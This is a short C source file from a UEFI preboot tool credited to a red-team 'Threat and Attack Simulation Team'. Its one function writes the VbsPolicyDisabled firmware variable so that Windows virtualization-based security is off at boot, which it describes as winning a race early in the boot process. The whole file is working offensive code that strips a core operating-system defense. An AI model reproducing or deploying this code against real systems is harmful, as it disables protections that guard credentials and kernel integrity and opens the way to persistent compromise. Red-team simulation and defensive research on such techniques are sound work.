/*!
 *
 * PREBOOT
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Disables virtualization based security using VbsPolicyDisabled. Must be
 * called early enough in the boot process to succeed in winning the race.
 *
!*/
D_SEC( B ) EFI_STATUS VbsDisable( _In_ EFI_SYSTEM_TABLE* SystemTable )
{
	EFI_GUID	Uid = { 0x77fa9abd, 0x0359, 0x4d32, { 0xbd, 0x60, 0x28, 0xf4, 0xe7, 0x8f, 0x78, 0x4b } };

	UINTN		Len = 0;
	UINT32		Att = 0;
	BOOLEAN		Dis = TRUE;
	EFI_STATUS	Est = EFI_NOT_FOUND;

	/* Query the variable */
	Est = SystemTable->RuntimeServices->GetVariable( C_PTR( G_PTR( L"VbsPolicyDisabled" ) ), &Uid, &Att, &Len, NULL );

	/* Does it exist?! */
	if ( Est != EFI_NOT_FOUND && Att != ( EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS ) || Len != sizeof( Dis ) ) {
		/* Clear the variable */
		SystemTable->RuntimeServices->SetVariable( C_PTR( G_PTR( L"VbsPolicyDisabled" ) ), &Uid, 0, 0, NULL );
	};

	/* Set the new value */
	Est = SystemTable->RuntimeServices->SetVariable( C_PTR( G_PTR( L"VbsPolicyDisabled" ) ), &Uid, EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS, sizeof( Dis ), &Dis );

	/* Return the status */
	return Est;
};
